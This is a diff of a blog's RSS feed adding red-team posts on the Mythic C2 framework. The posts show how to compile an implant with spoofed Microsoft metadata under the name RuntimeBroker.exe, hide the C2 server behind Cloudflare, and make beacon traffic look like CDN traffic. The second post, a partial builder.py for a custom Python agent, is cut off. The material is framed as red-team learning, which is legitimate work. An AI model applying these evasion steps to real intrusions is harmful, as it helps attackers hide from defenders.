@@ -6,8 +6,1192 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 25 Nov 2025 22:10:00 +0100</lastBuildDate>
+        <lastBuildDate>Mon, 13 Apr 2026 17:14:55 +0100</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Mythic C2 : Evading Advanced Detection Systems (Part 1)</title>
+            <link>/posts/evasion/</link>
+            <pubDate>Mon, 13 Apr 2026 17:14:55 +0100</pubDate>
+            
+            <guid>/posts/evasion/</guid>
+            <description>This is the continuation of this article
+Advanced Detection Systems are a real headache for red teamers (as they should be). Modern environments aren’t just relying on static AV anymore, you’re dealing with layered detection: AV, EDR, SIEM correlation, sometimes even behavioral ML on top.
+So instead of trying to “bypass everything” (which is unrealistic), the idea here is to reduce your footprint at each layer.
+In this part, I focused on a few steps that already make a big difference in a real-world engagement.</description>
+            <content type="html"><![CDATA[<blockquote>
+<p>This is the continuation of <a href="https://yassine-elhammoumi.github.io/posts/mythic_agent/">this article</a></p>
+</blockquote>
+<p>Advanced Detection Systems are a real headache for red teamers (as they should be). Modern environments aren’t just relying on static AV anymore, you’re dealing with layered detection: AV, EDR, SIEM correlation, sometimes even behavioral ML on top.</p>
+<p>So instead of trying to “bypass everything” (which is unrealistic), the idea here is to reduce your footprint at each layer.</p>
+<p>In this part, I focused on a few steps that already make a big difference in a real-world engagement. But before going into infra and traffic shaping, the first obvious checkpoint is: <em>does the payload even survive basic AV?</em></p>
+<p>Now that I made my own agent for Mythic, the goal is to make it less obvious to monitoring solutions, both at rest and in transit.</p>
+<hr>
+<h2 id="bypassing-avs">Bypassing AVs</h2>
+<p>Before doing anything fancy, I checked my payload against <a href="https://www.virustotal.com/">VirusTotal</a>. No surprises here; it got picked up by a couple of engines:</p>
+
+    <img src="/mythic/azure/virus_1.png"  alt="First virus total scan"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>At this stage, this is mostly signature + heuristic detection. Even a custom agent can still trigger flags depending on how it&rsquo;s packaged.</p>
+<p>I tried a couple of approaches, starting with <a href="https://pyinstaller.org/">PyInstaller</a>, but I found that <a href="https://nuitka.net/">Nuitka</a> gave noticeably better results:</p>
+
+    <img src="/mythic/azure/virus_2.png"  alt="Second virus total scan"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>The reasoning here is pretty straightforward:</p>
+<ul>
+<li><strong>PyInstaller</strong> bundles Python bytecode -&gt; easier to fingerprint</li>
+<li><strong>Nuitka</strong> compiles to C -&gt; then to machine code -&gt; significantly less “Python-looking” artifacts</li>
+</ul>
+<p>That alone reduces the number of trivial detections.</p>
+<p>Here’s the command I used to generate a Windows executable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -m nuitka <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --standalone <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --onefile <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --windows-console-mode<span style="color:#f92672">=</span>disable <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --python-flag<span style="color:#f92672">=</span>no_site <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --python-flag<span style="color:#f92672">=</span>no_warnings <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --python-flag<span style="color:#f92672">=</span>isolated <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --nofollow-import-to<span style="color:#f92672">=</span>tkinter <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --nofollow-import-to<span style="color:#f92672">=</span>unittest <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --enable-plugin<span style="color:#f92672">=</span>anti-bloat <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --windows-company-name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Microsoft Corporation&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --windows-product-name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Windows Host Process&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --windows-file-version<span style="color:#f92672">=</span>10.0.19041.1 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --windows-product-version<span style="color:#f92672">=</span>10.0.19041.1 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --windows-file-description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Windows Host Process (Rundll32)&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --output-filename<span style="color:#f92672">=</span>RuntimeBroker.exe <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  agent.py
+</span></span></code></pre></div><p>A couple of important details here:</p>
+<ul>
+<li><strong>Metadata spoofing</strong> (company name, product name, etc.) helps blend into legitimate binaries</li>
+<li><strong>Anti-bloat plugin</strong> reduces unnecessary imports -&gt; smaller surface for static analysis</li>
+<li><strong>Isolated Python flags</strong> remove environmental dependencies that can leak indicators</li>
+</ul>
+
+    <img src="/mythic/azure/nuitka.png"  alt="Compiling into python"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Writing your own agent already helps with AV evasion since there are no public signatures tied to it.
+That said, Mythic’s base implementations are still relatively well-known, so don’t assume you’re safe just because it’s “custom”.</p>
+<hr>
+<h2 id="azure-setup">Azure Setup</h2>
+<p><em>I won’t go too deep into Azure provisioning. This isn’t a cloud tutorial, just enough to get a realistic infra in place.</em></p>
+<p>We need a VM to host the C2 server. Minimum specs:</p>
+<ul>
+<li>2 CPUs</li>
+<li>4 GB RAM</li>
+</ul>
+<p>I went with Ubuntu, 2 CPUs and 8 GB RAM just to keep things smooth during deployment and testing:</p>
+
+    <img src="/mythic/azure/azure.png"  alt="Azure setup"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>No need for extra disk space, default boot disk is enough.</p>
+<p>For networking, open:</p>
+<ul>
+<li>SSH (management)</li>
+<li>HTTP / HTTPS (C2 traffic)</li>
+<li>Mythic UI (optional)</li>
+</ul>
+
+    <img src="/mythic/azure/azure_net.png"  alt="Azure network setup"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>I restricted the Mythic UI to my own IP. This reduces exposure significantly, but only makes sense if your IP is relatively stable, otherwise it becomes annoying quickly.</p>
+<p>Then you can just follow the install steps from <a href="https://yassine-elhammoumi.github.io/posts/install_mythic/">this article</a>.</p>
+<hr>
+<h2 id="cdn-setup">CDN Setup</h2>
+<p>This is where things start getting interesting from an evasion standpoint.</p>
+<p>The goal here is simple: <strong>don’t expose your origin server directly</strong>.</p>
+<p>Before using a CDN, a simple DNS lookup returns your actual Azure IP:</p>
+
+    <img src="/mythic/azure/dig_before.png"  alt="dig before CDN"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>That’s bad, defenders can:</p>
+<ul>
+<li>pivot directly to your infra</li>
+<li>scan your server</li>
+<li>correlate infrastructure across engagements</li>
+</ul>
+<p>So we put a CDN in front.</p>
+<p>First, you’ll need a domain. I just bought a cheap one (~$1). Free subdomains can work, but I ran into issues integrating them cleanly with <a href="https://www.cloudflare.com/application-services/products/cdn/">Cloudflare</a>.</p>
+<p>After onboarding your domain in Cloudflare:</p>
+<ul>
+<li>Enable automatic DNS import</li>
+<li>Replace your registrar’s nameservers with Cloudflare’s</li>
+</ul>
+
+    <img src="/mythic/azure/cloudflare.png"  alt="cloudflare setup"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Then… wait. DNS propagation can take awhile.</p>
+<p>Once everything is set, querying your domain now returns Cloudflare IPs instead of your VM:</p>
+
+    <img src="/mythic/azure/dig_after.png"  alt="dig after CDN"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>This gives you:</p>
+<ul>
+<li><strong>Origin IP masking</strong></li>
+<li><strong>Basic traffic normalization</strong></li>
+<li><strong>A layer between you and direct attribution</strong></li>
+</ul>
+<p>Not bulletproof, but way better than exposing your VM raw.</p>
+<hr>
+<h2 id="http-profile-setup">HTTP Profile Setup</h2>
+<p>Now we move to traffic legitimacy.</p>
+<p>Using plain HTTP in 2026 is basically asking to get flagged. So we switch to HTTPS with valid certificates.</p>
+<p>First, generate certs using certbot:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get install -y certbot
+</span></span><span style="display:flex;"><span>sudo certbot certonly --register-unsafely-without-email <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d your.domain
+</span></span></code></pre></div><p>Then copy them into the Mythic HTTP profile:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cp /etc/letsencrypt/live/YOURDOMAIN/fullchain.pem .
+</span></span><span style="display:flex;"><span>sudo cp /etc/letsencrypt/live/YOURDOMAIN/privkey.pem .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copy certs into HTTP C2 container</span>
+</span></span><span style="display:flex;"><span>sudo docker ps | grep http
+</span></span><span style="display:flex;"><span>sudo docker cp fullchain.pem CONTAINER_ID:/Mythic/http/c2_code/fullchain.pem
+</span></span><span style="display:flex;"><span>sudo docker cp privkey.pem CONTAINER_ID:/Mythic/http/c2_code/privkey.pem
+</span></span></code></pre></div><p>Update the HTTP profile config:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;instances&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">443</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;key_path&#34;</span>: <span style="color:#e6db74">&#34;privkey.pem&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;cert_path&#34;</span>: <span style="color:#e6db74">&#34;fullchain.pem&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;debug&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;use_ssl&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;ServerHeaders&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Cache-Control&#34;</span>: <span style="color:#e6db74">&#34;max-age=0, no-cache&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;keep-alive&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/javascript; charset=utf-8&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Pragma&#34;</span>: <span style="color:#e6db74">&#34;no-cache&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Server&#34;</span>: <span style="color:#e6db74">&#34;NetDNA-cache/2.2&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;error_file_path&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;error_status_code&#34;</span>: <span style="color:#ae81ff">404</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;payloads&#34;</span>: {}
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Important points:</p>
+<ul>
+<li><strong>Port 443</strong> -&gt; blends with normal HTTPS traffic</li>
+<li><strong>Valid TLS cert</strong> -&gt; avoids TLS inspection flags</li>
+<li><strong>Custom headers</strong> -&gt; helps mimic legitimate CDN/web traffic</li>
+</ul>
+
+    <img src="/mythic/azure/http_conf.png"  alt="http configuration"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>When generating payloads:</p>
+<ul>
+<li>Use your <strong>domain</strong>, not the IP</li>
+<li>Use <code>https://</code>, not <code>http://</code></li>
+</ul>
+<p>Otherwise, the CDN + TLS setup becomes useless.</p>
+
+    <img src="/mythic/azure/http_conf_2.png"  alt="http configuration"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+<h2 id="closing-thoughts">Closing Thoughts</h2>
+<p>This part is mostly about <strong>infrastructure-level evasion</strong>:</p>
+<ul>
+<li>Reducing AV detections (payload side)</li>
+<li>Hiding origin infrastructure (CDN)</li>
+<li>Making traffic look legitimate (HTTPS + headers)</li>
+</ul>
+<p>It’s far from enough on its own.</p>
+<p>Detection today is heavily behavioral, so even with clean infra, bad tradecraft will still get you caught.</p>
+<p>Next parts will go deeper into:</p>
+<ul>
+<li>traffic shaping</li>
+<li>beacon design</li>
+<li>and ways to reduce behavioral indicators</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Building a Custom Mythic Agent from Scratch (in Python)</title>
+            <link>/posts/mythic_agent/</link>
+            <pubDate>Wed, 08 Apr 2026 11:09:02 +0100</pubDate>
+            
+            <guid>/posts/mythic_agent/</guid>
+            <description>This is the continuation of this article
+## Introduction
+Now that we have a working Mythic setup, we&amp;rsquo;re able to deep diver into C2 architecture and start integrating our own tools and techniques to the base platform.
+The goal is simple:
+Understand how an agent really works internally Build my own minimal implant Extend it with a custom command tied to a real-world privilege escalation exploit Integrate everything cleanly into Mythic’s tasking system Understanding the Agent Model To get started, we have example containers available to help us understand the file structures.</description>
+            <content type="html"><![CDATA[<blockquote>
+<p>This is the continuation of <a href="yassine-elhammoumi.github.io/posts/install_mythic/">this article</a></p>
+</blockquote>
+<p>## Introduction</p>
+<p>Now that we have a working Mythic setup, we&rsquo;re able to deep diver into C2 architecture and start integrating our own tools and techniques to the base platform.</p>
+<p>The goal is simple:</p>
+<ul>
+<li>Understand how an agent really works internally</li>
+<li>Build my own minimal implant</li>
+<li>Extend it with a custom command tied to a real-world privilege escalation exploit</li>
+<li>Integrate everything cleanly into Mythic’s tasking system</li>
+</ul>
+<h2 id="understanding-the-agent-model">Understanding the Agent Model</h2>
+<p>To get started, we have <a href="https://github.com/MythicMeta/ExampleContainers">example containers</a> available to help us understand the file structures. You can read the docs to understand it better. But to make this post shorter, I&rsquo;ll give a high level explanation of everything I did.</p>
+<h3 id="stripping-down-the-example-containers">Stripping down the Example Containers</h3>
+<p>Inside the cloned repo. There are python and Go services, I&rsquo;ll use python to define my project, so we can remove the Go services. Inside the python services, there are multiple directories, we&rsquo;ll only be needing the <code>basic_python_agent</code>, the rest we can get rid of.</p>
+<p>Here&rsquo;s an overview of what my directory looked like up to this point :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── basic_python_agent
+</span></span><span style="display:flex;"><span>│   ├── agent_code
+</span></span><span style="display:flex;"><span>│   │   ├── base
+</span></span><span style="display:flex;"><span>│   │   │   └── apfell-jxa.js
+</span></span><span style="display:flex;"><span>│   │   ├── c2_profiles
+</span></span><span style="display:flex;"><span>│   │   │   ├── dynamichttp.js
+</span></span><span style="display:flex;"><span>│   │   │   └── http.js
+</span></span><span style="display:flex;"><span>│   │   ├── download.js
+</span></span><span style="display:flex;"><span>│   │   ├── exit.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_apps.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_entitlements.js
+</span></span><span style="display:flex;"><span>│   │   ├── ls.js
+</span></span><span style="display:flex;"><span>│   │   ├── shell.js
+</span></span><span style="display:flex;"><span>│   │   └── upload.js
+</span></span><span style="display:flex;"><span>│   ├── agent_functions
+</span></span><span style="display:flex;"><span>│   │   ├── basic_python_agent.svg
+</span></span><span style="display:flex;"><span>│   │   ├── builder.py
+</span></span><span style="display:flex;"><span>│   │   ├── download.py
+</span></span><span style="display:flex;"><span>│   │   ├── exit.py
+</span></span><span style="display:flex;"><span>│   │   ├── __init__.py
+</span></span><span style="display:flex;"><span>│   │   ├── list_apps.py
+</span></span><span style="display:flex;"><span>│   │   ├── list_entitlements.py
+</span></span><span style="display:flex;"><span>│   │   ├── ls.py
+</span></span><span style="display:flex;"><span>│   │   ├── shell.py
+</span></span><span style="display:flex;"><span>│   │   └── upload.py
+</span></span><span style="display:flex;"><span>│   ├── browser_scripts
+</span></span><span style="display:flex;"><span>│   │   ├── download_new.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_apps_new.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_entitlements_new.js
+</span></span><span style="display:flex;"><span>│   │   └── ls_new.js
+</span></span><span style="display:flex;"><span>│   └── __init__.py
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── __init__.py
+</span></span><span style="display:flex;"><span>├── main.py
+</span></span><span style="display:flex;"><span>└── rabbitmq_config.json
+</span></span></code></pre></div><p>Now, we&rsquo;re able to test things out by copying our <code>basic_python_agent</code> Directory inside the <code>InstalledServices</code> Directory inside our Mythic folder hierarchy (refer to <a href="yassine-elhammoumi.github.io/posts/install_mythic/">this</a> if you don&rsquo;t know what I&rsquo;m talking about).</p>
+<p>We need to add service and build it :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp -R basic/agent/directory installed/services/directory
+</span></span><span style="display:flex;"><span>sudo ./mythic-cli add python_services
+</span></span><span style="display:flex;"><span>sudo ./mythic-cli build python_services
+</span></span></code></pre></div>
+    <img src="/mythic/first_step/first_build.png"  alt="Building our first service"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>We can see that everything worked as it was supposed to by checking the UI.</p>
+
+    <img src="/mythic/first_step/online.png"  alt="Checking that the agent is online"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p><em>note : Make sure to remove the uninstalled services from <code>main.py</code> and use <code>sudo ./mythic-cli logs basic_python_agent</code> to troubleshoot</em></p>
+
+    <img src="/mythic/first_step/unused.png"  alt="Making sure unused services are commented out"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h3 id="customizing-our-agent">Customizing Our Agent</h3>
+<p>The file that uses as a reference for building your agent is the <code>builder.py</code> inside the <code>agent_functions</code> directory.</p>
+<p>You&rsquo;ll need to change the name, file extension, supported OS and basically everything inside your agent class to fit your need. On my end, I wanted to use python to build my payload and support both Linux and Windows. I ended up with the following file :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.PayloadBuilder <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicCommandBase <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicRPC <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> asyncio<span style="color:#f92672">,</span> pathlib<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> tempfile<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> hashlib<span style="color:#f92672">,</span> json<span style="color:#f92672">,</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> cycle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">WeeAgent</span>(PayloadType):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;WeeAgent&#34;</span>
+</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;py&#34;</span>
+</span></span><span style="display:flex;"><span>    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@Yassine-elhammoumi&#34;</span>
+</span></span><span style="display:flex;"><span>    supported_os <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        SupportedOS<span style="color:#f92672">.</span>Linux, SupportedOS<span style="color:#f92672">.</span>Windows 
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>    wrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    wrapped_payloads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    mythic_encrypts <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    note <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Test Agent for a Linux and Windows&#34;</span>
+</span></span><span style="display:flex;"><span>    supports_dynamic_loading <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    c2_profiles <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;http&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    build_parameters <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        BuildParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;output&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>BuildParameterType<span style="color:#f92672">.</span>ChooseOne,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Choose output format&#34;</span>,
+</span></span><span style="display:flex;"><span>            choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;py&#34;</span>, <span style="color:#e6db74">&#34;base64&#34;</span>],
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;py&#34;</span>
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        BuildParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;python_version&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>BuildParameterType<span style="color:#f92672">.</span>ChooseOne,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Choose Python version&#34;</span>,
+</span></span><span style="display:flex;"><span>            choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Python 3.8&#34;</span>, <span style="color:#e6db74">&#34;Python 2.7&#34;</span>],
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Python 3.8&#34;</span>
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        BuildParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https_check&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>BuildParameterType<span style="color:#f92672">.</span>ChooseOne,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Verify HTTPS certificate (if HTTP, leave yes)&#34;</span>,
+</span></span><span style="display:flex;"><span>            choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Yes&#34;</span>, <span style="color:#e6db74">&#34;No&#34;</span>],
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Yes&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    agent_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;mythic&#34;</span>
+</span></span><span style="display:flex;"><span>    agent_icon_path <span style="color:#f92672">=</span> agent_path <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent.svg&#34;</span>
+</span></span><span style="display:flex;"><span>    agent_code_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;agent_code&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    build_steps <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        BuildStep(step_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gathering Files&#34;</span>, step_description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Creating script payload&#34;</span>)
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    translation_container <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getPythonVersionFile</span>(self, directory, file):
+</span></span><span style="display:flex;"><span>        pyv <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_parameter(<span style="color:#e6db74">&#34;python_version&#34;</span>)
+</span></span><span style="display:flex;"><span>        filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py&#34;</span><span style="color:#f92672">.</span>format(file))):
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#while we&#39;ve specified a python version, this function is agnostic so just return the .py</span>
+</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py&#34;</span><span style="color:#f92672">.</span>format(file))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> pyv <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Python 2.7&#34;</span>:
+</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py2&#34;</span><span style="color:#f92672">.</span>format(file))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> pyv <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Python 3.8&#34;</span>:
+</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py3&#34;</span><span style="color:#f92672">.</span>format(file))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(filename) <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> filename:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> filename
+</span></span><span style="display:flex;"><span>
